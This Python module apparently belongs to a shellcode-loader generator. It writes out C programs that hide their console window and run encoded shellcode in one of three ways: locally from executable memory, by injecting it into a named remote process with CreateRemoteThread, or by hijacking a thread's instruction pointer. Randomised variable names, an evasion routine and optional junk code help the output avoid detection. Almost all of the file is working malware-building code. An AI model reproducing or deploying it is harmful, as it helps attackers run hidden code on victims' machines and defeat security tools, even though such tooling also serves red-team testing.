from lib import core, evasion


def exercise_room(arch, inject_type, procname, filename, junkcode, sleep, vshellcode, decoder_stub):
    exec_code = ""
    raw_code = ""
    final_code = ""
    if inject_type == "local":
        exec_code += local_ti(vshellcode, decoder_stub)
        raw_code += body_builder(arch, filename, sleep, exec_code)

    elif inject_type == "remote":
        exec_code += remote_ti(procname, vshellcode, decoder_stub)
        raw_code += body_builder(arch, filename, sleep, exec_code)

    elif inject_type == "hijack":
        exec_code += remote_pth(procname, vshellcode, decoder_stub, arch)
        raw_code += body_builder(arch, filename, sleep, exec_code)

    if junkcode == "yes":
        final_code += evasion.junk_inject(raw_code)
    else:
        final_code += raw_code

    final_code = headers() + final_code
    return final_code


def body_builder(arch, filename, sleep, exec_code):
    raw_code = main()
    raw_code += evasion.the_great_evasion(arch, filename)
    raw_code += sleep
    raw_code += exec_code
    return raw_code


def headers():
    header = ["#include <windows.h>\n", "#include <memoryapi.h>\n", "#include <tlhelp32.h>\n", "#include <stdio.h>\n", "#include <stdlib.h>\n", "#include <time.h>\n", "#include <math.h>\n", '#include <psapi.h>\n']
    lheaders = ""
    for i in header:
        lheaders += i
    return lheaders


def main():
    hWnd = core.varname_creator()
    hw = "int main(int argc, char * argv[]){"
    hw += f"HWND {hWnd} = GetConsoleWindow();"
    hw += f"ShowWindow({hWnd}, SW_HIDE);\n"
    return hw


def local_ti(vshellcode, decoder_stub):
    execs = core.varname_creator()
    lti = decoder_stub
    lti += f"\nvoid *{execs} = VirtualAlloc(0, sizeof {vshellcode}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    lti += f"memcpy({execs}, {vshellcode}, sizeof {vshellcode});\n"
    lti += f"((void(*)()){execs})();\n"
    lti += "}"
    return lti


def remote_ti(procname, vshellcode, decoder_stub):
    entry = core.varname_creator()
    snapshot = core.varname_creator()
    process_handle = core.varname_creator()
    remote_thread = core.varname_creator()
    remote_buffer = core.varname_creator()
    rti = decoder_stub
    rti += f"\nPROCESSENTRY32 {entry};\n"
    rti += f"{entry}.dwSize = sizeof(PROCESSENTRY32);\n"
    rti += f"HANDLE {snapshot} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);"
    rti += f"if (Process32First({snapshot}, &{entry}) == TRUE)" + "{"
    rti += f"while (Process32Next({snapshot}, &{entry}) == TRUE)" + "{"
    rti += f'if (stricmp({entry}.szExeFile, "{procname}") == 0)' + "{\n"
    rti += f"HANDLE {process_handle};\n"
    rti += f"HANDLE {remote_thread};\n"
    rti += f"PVOID {remote_buffer};\n"
    rti += f"{process_handle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + entry + ".th32ProcessID);\n"
    rti += f"{remote_buffer} = VirtualAllocEx({process_handle}, NULL, sizeof {vshellcode}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n"
    rti += f"WriteProcessMemory({process_handle}, {remote_buffer}, {vshellcode}, sizeof {vshellcode}, NULL);\n"
    rti += f"{remote_thread} = CreateRemoteThread({process_handle}, NULL, 0, (LPTHREAD_START_ROUTINE){remote_buffer}, NULL, 0, NULL);\n"
    rti += f"CloseHandle({process_handle});"
    rti += "}}}"
    rti += f"CloseHandle({snapshot});"
    rti += "}"
    return rti


def remote_pth(procname, vshellcode, decoder_stub, arch):
    entry = core.varname_creator()
    snapshot0 = core.varname_creator()
    targetProcessHandle = core.varname_creator()
    remoteBuffer = core.varname_creator()
    threadHijacked = core.varname_creator()
    snapshot1 = core.varname_creator()
    threadEntry = core.varname_creator()
    context = core.varname_creator()
    contextArch = "Rip"
    if arch == "x86":
        contextArch = "Eip"
    rpth = decoder_stub
    rpth += f"\nPROCESSENTRY32 {entry};"
    rpth += f"{entry}.dwSize = sizeof(PROCESSENTRY32);"
    rpth += f"HANDLE {snapshot0} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);"
    rpth += f"if (Process32First({snapshot0}, &{entry}) == TRUE)" + "{"
    rpth += f"while (Process32Next({snapshot0}, &{entry}) == TRUE)" + "{"
    rpth += f'if (stricmp({entry}.szExeFile, "{procname}") == 0)' + "{"
    rpth += f"HANDLE {targetProcessHandle};"
    rpth += f"PVOID {remoteBuffer};"
    rpth += f"HANDLE {threadHijacked }= NULL;"
    rpth += f"HANDLE {snapshot1};"
    rpth += f"THREADENTRY32 {threadEntry};"
    rpth += f"CONTEXT {context};"
    rpth += f"{context}.ContextFlags = CONTEXT_FULL;"
    rpth += f"{threadEntry}.dwSize = sizeof(THREADENTRY32);"
    rpth += f"{targetProcessHandle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, {entry}.th32ProcessID);"
    rpth += f"{remoteBuffer} = VirtualAllocEx({targetProcessHandle}, NULL, sizeof {vshellcode}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);"
    rpth += f"WriteProcessMemory({targetProcessHandle}, {remoteBuffer}, {vshellcode}, sizeof {vshellcode}, NULL);"
    rpth += f"{snapshot1} = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);"
    rpth += f"Thread32First({snapshot1}, &{threadEntry});"
    rpth += f"while (Thread32Next({snapshot1}, &{threadEntry}))" + "{"
    rpth += f"if ({threadEntry}.th32OwnerProcessID == {entry}.th32ProcessID)" + "{"
    rpth += f"{threadHijacked} = OpenThread(THREAD_ALL_ACCESS, FALSE, {threadEntry}.th32ThreadID);" + "break;}}"
    rpth += f"SuspendThread({threadHijacked});"
    rpth += f"GetThreadContext({threadHijacked}, &{context});"
    rpth += f"{context}.{contextArch} = (DWORD_PTR){remoteBuffer};"
    rpth += f"SetThreadContext({threadHijacked}, &{context});"
    rpth += f"ResumeThread({threadHijacked});" + "}}}"
    rpth += f"CloseHandle({snapshot0});" + "}"
    return rpth
